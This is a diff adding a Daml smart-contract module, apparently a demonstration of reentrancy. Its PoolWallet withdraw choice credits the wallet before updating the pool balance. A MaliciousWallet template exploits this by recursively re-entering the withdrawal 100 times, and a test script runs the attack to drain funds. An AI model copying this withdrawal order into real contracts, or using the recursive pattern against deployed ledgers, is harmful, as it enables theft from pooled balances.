@@ -1,0 +1,146 @@
+module Pool where
+
+import Iou
+import Wallet
+import MultiWallet
+
+
+import DA.Map (Map)
+import qualified DA.Map as Map
+import DA.Set (Set)
+import qualified DA.Set as Set
+import DA.Optional as Optional
+
+import DA.Assert
+import Daml.Script
+
+template Pool
+  with
+    public: Party
+    issuer: Party
+    balances: Map Party Int
+  where
+    signatory issuer
+    observer public
+    key issuer: Party
+    maintainer key
+
+    nonconsuming choice PootBalance: Int
+      with
+        user: Party
+      controller issuer
+      do
+        pure $ Optional.fromOptional 0 (Map.lookup user balances)
+
+    choice PoolSetBalance: ContractId Pool
+      with
+        user: Party
+        newBalance: Int
+      controller issuer
+      do
+        create this with balances = (Map.insert user newBalance balances)
+
+
+template PoolWallet
+  with
+    issuer: Party
+    user: Party
+  where
+    signatory issuer
+    observer user
+
+    nonconsuming choice CreditPoolWallet: ()
+      with
+        iouId: IouId
+      controller user
+      do
+        balance <- exerciseByKey @Pool issuer (PootBalance user)
+        iou <- fetch iouId
+        iou.issuer === issuer
+        _ <- exerciseByKey @Pool issuer (PoolSetBalance user (balance + iou.amount))
+        _ <- archive iouId
+        pure ()
+
+    nonconsuming choice WithdrawPoolWallet: WalletId
+      with
+        wallet: WalletId
+        amount: Int
+      controller user
+      do
+        balance <- exerciseByKey @Pool issuer (PootBalance user)
+        assert (amount <= balance)
+        iou <- create Iou with issuer = issuer, owner = user, amount = amount
+        newWallet <- exercise wallet (UnsafeCredit issuer iou)
+        _ <- exerciseByKey @Pool issuer (PoolSetBalance user (balance - amount))
+        pure newWallet
+
+
+template MaliciousWallet
+  with
+    owner: Party
+    issuerWallet: ContractId PoolWallet
+    innerWallet: WalletId
+    iteration: Int
+    target: Party
+  where
+    signatory owner
+    observer target
+
+    implements Wallet where
+      let getOwner = owner
+
+      let credit_ = \iouId -> do
+            iou <- fetch iouId
+            newInnerWallet <- exercise innerWallet (UnsafeCredit iou.issuer iouId)
+            if iteration == 0 then
+              pure newInnerWallet
+            else do
+              wallet <- create this with innerWallet = newInnerWallet, iteration = iteration - 1
+              exercise issuerWallet (WithdrawPoolWallet (toWalletContractId wallet) iou.amount)
+
+      let withdraw_ = \issuer ->  error "Not Implemeted"
+
+testMulti: Script ()
+testMulti =
+  do
+
+    public <- allocatePartyWithHint "Public" (PartyIdHint "Public")
+
+    sg <- allocatePartyWithHint "Societe Genial" (PartyIdHint "Societe Genial")
+
+    alice <- allocatePartyWithHint "Alice" (PartyIdHint "Alice")
+
+    pool <- submitMulti [sg] [public]
+      do
+        createCmd (Pool public sg (Map.fromList [(alice, 10)]))
+
+    issuerWallet <- submitMulti [sg] [public]
+      do
+        createCmd (PoolWallet sg alice)
+
+    aliceWallet_ <- submit alice
+      do
+        createCmd MultiWallet with owner = alice, ious = Map.empty, observers = Set.fromList [sg]
+    let aliceWallet = toWalletContractId aliceWallet_
+
+    aliceWallet <- submitMulti [alice] [public]
+      do
+        exerciseCmd issuerWallet (WithdrawPoolWallet aliceWallet 5)
+
+    attackerWallet_ <- submitMulti [alice] [public]
+      do
+        createCmd MaliciousWallet with
+            owner = alice
+            issuerWallet = issuerWallet
+            innerWallet = aliceWallet
+            iteration = 100
+            target = sg
+    let attackerWallet = toWalletContractId attackerWallet_
+
+    aliceWallet <- submitMulti [alice] [public]
+      do
+        exerciseCmd issuerWallet (WithdrawPoolWallet attackerWallet 5)
+
+
+
+    pure ()
